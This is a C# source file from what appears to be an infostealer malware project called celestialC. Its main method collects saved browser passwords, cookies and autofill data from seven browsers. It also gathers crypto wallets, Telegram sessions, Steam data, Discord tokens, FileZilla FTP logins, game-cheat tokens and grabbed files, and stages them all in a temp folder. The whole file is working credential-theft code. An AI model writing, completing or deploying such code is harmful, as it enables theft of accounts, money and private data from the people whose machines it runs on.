using celestialC.Stealer.Browsers;
using celestialC.Stealer.Cheats;
using celestialC.Stealer.Crypto;
using celestialC.Stealer.FTP;
using celestialC.Stealer.Gaming.Steam;
using celestialC.Stealer.Messenger.Discord;
using celestialC.Stealer.Messenger.Telegram;
using celestialC.Stealer.SystemZ;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer
{
    public static class Stealer
    {
        public static int cookiesCount = 0;
        public static int passwordsCount = 0;
        public static int discordTokenCount = 0;
        public static int filezillahosts = 0;
        public static int walletsCount = 0;
        public static int telegramSessionCount = 0;
        public static int fillscount = 0;
        public static async Task<string> StealEverything()
        {
            Random random = new Random();
            string tempFolder = Path.Combine(Path.GetTempPath(), random.Next(1234567890).ToString());
            if (Directory.Exists(tempFolder)) Directory.Delete(tempFolder, true);
            Directory.CreateDirectory(tempFolder);
            try
            {

                //pass
                var getChromePasswords = true ? Chrome.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
                var getChromiumPasswords = true ? Chromium.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
                var getEdgePasswords = true ? Edge.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
                var getOperaPasswords = true ? Opera.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
                var getOperaGxPasswords = true ? OperaGx.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
                var getYandexPasswords = true ? Yandex.GetPasswords() : Task.Run(() => new PasswordFormat[] { });

                //cookie
                var getChromeCookies = true ? Chrome.GetCookies() : Task.Run(() => new CookieFormat[] { });
                var getChromiumCookies = true ? Chromium.GetCookies() : Task.Run(() => new CookieFormat[] { });
                var getEdgeCookies = true ? Edge.GetCookies() : Task.Run(() => new CookieFormat[] { });
                var getOperaCookies = true ? Opera.GetCookies() : Task.Run(() => new CookieFormat[] { });
                var getOperaGxCookies = true ? OperaGx.GetCookies() : Task.Run(() => new CookieFormat[] { });
                var getYandexCookies = true ? Yandex.GetCookies() : Task.Run(() => new CookieFormat[] { });
                var getFirefoxCookies = true ? Firefox.GetCookies() : Task.Run(() => new CookieFormat[] { });

                //autofills
                var getChromeAutofills = true ? Chrome.GetAutoFills() : Task.Run(() => new AutoFillFormat[] { });
                var getEdgeAutofills = true ? Edge.GetAutoFills() : Task.Run(() => new AutoFillFormat[] { });

                //other
                var stealWallets = true ? WalletStealer.StealWallets(Path.Combine(tempFolder, "Wallets")) : Task.Run(() => 0);
                var stealTelegramSessions = true ? SessionStealer.StealSessions(Path.Combine(tempFolder, "Messenger", "Telegram")) : Task.Run(() => 0);
                var stealSteamInfo = true ? InfoStealer.StealSessions(Path.Combine(tempFolder, "Gaming", "Steam")) : Task.Run(() => 0);
                var getTokens = true ? TokenStealer.GetAccounts() : Task.Run(() => new DiscordAccountFormat[] { });
                var getFTP = true ? Filezilla.StealFTP() : Task.Run(() => new PasswordFormat[] { });
                var getNeverlosetoken = true ? neverlose.StealToken(Path.Combine(tempFolder, "Cheats", "neverlose")) : Task.Run(() => 0);
                var getspirthacktoken = true ? spirthack.StealToken(Path.Combine(tempFolder, "Cheats", "spirthack")) : Task.Run(() => 0);
                var stealFiles = true ? Grabber.Run(Path.Combine(tempFolder, "Grabber")) : Task.Run(() => 0);

                await Task.WhenAll(getChromeCookies, getChromiumCookies, getChromePasswords, getChromiumPasswords, getEdgePasswords, getOperaGxPasswords,
                    getOperaPasswords, getYandexPasswords, getFirefoxCookies, getEdgeAutofills,
                 getOperaGxCookies, getEdgeCookies, getYandexCookies, getOperaCookies,
                   stealWallets, getTokens, stealTelegramSessions, getFTP, stealSteamInfo, getNeverlosetoken, getspirthacktoken, stealFiles);

                var chromePasswords = await getChromePasswords;
                var chromiumPasswords = await getChromiumPasswords;
                var edgePasswords = await getEdgePasswords;
                var operaPasswords = await getOperaPasswords;
                var operaGxPasswords = await getOperaGxPasswords;
                var yandexPasswords = await getYandexPasswords;

                var chromeCookies = await getChromeCookies;
                var chromiumCookies = await getChromiumCookies;
                var edgeCookies = await getEdgeCookies;
                var operaCookies = await getOperaCookies;
                var operaGxCookies = await getOperaGxCookies;
                var yandexCookies = await getYandexCookies;
                var firefoxCookies = await getFirefoxCookies;

                var chromefills = await getChromeAutofills;
                var edgefills = await getEdgeAutofills;

                var discordAccounts = await getTokens;
                var filezillaACCS = await getFTP;

                var saveProcesses = new List<Task>();
                walletsCount = await stealWallets;
                telegramSessionCount = await stealTelegramSessions;

                if (discordAccounts.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Messenger", "Discord");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(discordAccounts, Path.Combine(saveTo, "Discord Accounts.txt")));
                    discordTokenCount += discordAccounts.Length;
                }

                if (filezillaACCS.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "FTP");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(filezillaACCS, Path.Combine(saveTo, "FileZilla.txt")));
                    filezillahosts += filezillaACCS.Length;
                }

                //pass
                if (chromePasswords.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Chrome");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(chromePasswords, Path.Combine(saveTo, "Passwords.txt")));
                    passwordsCount += chromePasswords.Length;
                }
                if (chromiumPasswords.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Chromium");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(chromiumPasswords, Path.Combine(saveTo, "Passwords.txt")));
                    passwordsCount += chromiumPasswords.Length;
                }
                if (edgePasswords.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Edge");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(edgePasswords, Path.Combine(saveTo, "Passwords.txt")));
                    passwordsCount += edgePasswords.Length;
                }
                if (operaPasswords.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Opera");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(operaPasswords, Path.Combine(saveTo, "Passwords.txt")));
                    passwordsCount += operaPasswords.Length;
                }

                if (operaGxPasswords.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "OperaGX");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(operaGxPasswords, Path.Combine(saveTo, "Passwords.txt")));
                    passwordsCount += operaGxPasswords.Length;
                }
                if (yandexPasswords.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Yandex");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(yandexPasswords, Path.Combine(saveTo, "Passwords.txt")));
                    passwordsCount += yandexPasswords.Length;
                }

                //cookies
               if (chromeCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Chrome");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(chromeCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += chromeCookies.Length;
                }
                if (chromiumCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Chromium");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(chromiumCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += chromiumCookies.Length;
                }
                if (edgeCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Edge");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(edgeCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += edgeCookies.Length;
                }
                if (operaCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Opera");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(operaCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += operaCookies.Length;
                }

                if (operaGxCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "OperaGX");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(operaGxCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += operaGxCookies.Length;
                }
                if (yandexCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Yandex");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(yandexCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += yandexCookies.Length;
                }
                if (firefoxCookies.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Firefox");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(firefoxCookies, Path.Combine(saveTo, "Cookies.txt")));
                    cookiesCount += firefoxCookies.Length;
                }

                //autofills
                if (chromefills.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Chrome");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(chromefills, Path.Combine(saveTo, "autofill.txt")));
                    fillscount += chromefills.Length;
                }
                if(edgefills.Length > 0)
                {
                    string saveTo = Path.Combine(tempFolder, "Browsers", "Edge");
                    Directory.CreateDirectory(saveTo);
                    saveProcesses.Add(SaveTo.SaveToFile(edgefills, Path.Combine(saveTo, "autofill.txt")));
                    fillscount += edgefills.Length;
                }

                await Task.WhenAll(saveProcesses);
                return tempFolder;
            }
            catch { return tempFolder; }
        }
    }
}
